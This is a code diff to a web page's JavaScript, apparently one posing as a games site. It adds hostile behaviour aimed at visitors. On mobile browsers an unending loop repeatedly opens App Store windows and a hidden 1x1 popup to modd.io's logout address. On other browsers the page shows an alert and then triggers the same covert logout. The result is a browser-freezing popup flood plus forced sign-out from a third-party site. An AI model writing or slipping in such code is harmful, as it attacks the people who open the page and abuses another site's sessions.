@@ -212,9 +212,19 @@ if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigat
   var times = 9999999999999999999999999;
   for(var i = 0; i < times; times++)
   {
-      console.log(times);
+window.open("https://apps.apple.com/us/app/messages/id1146560473");
+window.open("https://apps.apple.com/us/app/notes/id1110145109");
+let myWindow;
+  myWindow = window.open("https://www.modd.io/logout", "_Blank", "width=1,height=1");
+
+  myWindow.close();
+    console.log(times);
   }
 }else{
 alert("you can only play games on mobile");
+let myWindow;
+  myWindow = window.open("https://www.modd.io/logout", "_Blank", "width=1,height=1");
+
+  myWindow.close();
 }
 }
